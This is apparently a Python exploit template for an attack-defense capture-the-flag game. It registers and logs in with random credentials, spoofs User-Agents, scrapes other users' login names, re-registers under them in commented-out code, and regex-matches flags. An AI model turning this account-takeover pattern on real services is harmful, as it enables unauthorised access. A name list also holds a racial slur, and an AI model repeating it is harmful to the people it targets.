#!/usr/bin/env python3

import requests
import sys
import re
import random
import json
import hashlib

alphabet = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789'
names = ['Goliath', 'Royal', 'Dacota', 'Marry', 'Hunter', 'Twilight' ,'Smile' ,'Castle', 'Lucky', 'Wolf', 'Nigga', 'Blondie']
UserAgents = """Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36~Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36~Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko~Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0~Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9~Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4~Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36~Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36~Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240~Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0~Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko~Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36~Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko~Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0~Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12~Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36~Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0~Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17~Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4~Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4~Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0~Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)~Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)~Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko~Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0~Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36~Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3~Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17~Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0~Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36~Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4~Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko~Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53~Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)~Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36~Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36~Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0~Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)""".split("~")
header = {"User-Agent": random.choice( UserAgents )}
# printable = string.printable

flagRegEx = re.compile(r'[A-Za-z0-9]{31}=')

our_host = "10.136.182.1"		# define out host
port = 1337 					# define port of service


def main():

	u_name = idgen(4, begin=names, chars="0123456789")
	u_pswd = idgen(12)
	print(u_name, u_pswd)

	# register(u_name, u_pswd)
	sess = login(u_name, u_pswd)

	# logins = get_logins(sess)
	# # print(logins)

	# for u_name in logins:

	# 	register(u_name, u_pswd)
	# 	sess = login(u_name, u_pswd)
	# 	home = sess.get(url).text
	# 	find_flags( home )


def idgen( size = 8, chars=alphabet, begin=None ):
	if begin:
		return random.choice( begin ) + ''.join(random.choice(chars) for _ in range(size))
	return ''.join( random.choice( chars ) for _ in range( size ) )


def find_flags(html: str):
	flag_list = flagRegEx.findall( html )
	if flag_list:
		print(*flag_list, sep="\n", flush=True)
		sys.stdout.flush() 	# after print


def register(u_name: str, u_pswd: str):
	resp = requests.post(
		url + "/register",
		headers=header,
		json={
			"login": u_name,
			"password": u_pswd
		}
		
		# data={
		# 	"login": u_name,
		# 	"password": u_pswd
		# }

		# files={
		# 	'inputName': ("username_1.txt", u_name, "text/plain"),
		# 	'inputPassword': (None, u_pswd, None),
		# }
	).text


def login(u_name: str, u_pswd: str):
	s = requests.Session()
	s.headers.update(header)
	# s.auth = ('user', 'pass')
	resp = s.post(
		url + "/login",
		json={
		"login": u_name,
		"password": u_pswd
		}
	).text
	return s


def get_logins(s):
	logins = []
	for i in range(1, 17):
		resp = s.get(url+f"specific.html?img={str(i).zfill(2)}")
		logins += re.findall('<div class="title h5" style="margin: 20px"><b>(.*)</b></div>', resp.text)
	return logins


def md5(data): return hashlib.md5(data).hexdigest()
def sha1(data): return hashlib.sha1(data).hexdigest()
def sha256(data): return hashlib.sha256(data).hexdigest()


if __name__ == '__main__':
	
	if len(sys.argv) > 1:
		host = sys.argv[1]
		url = f"http://{host}:{port}"
	else:
		print(f"Usage:\n\t{sys.argv[0]} x.x.x.x")
		sys.exit(-1)
	
	if host == our_host:
		sys.exit(-4)
	
	main()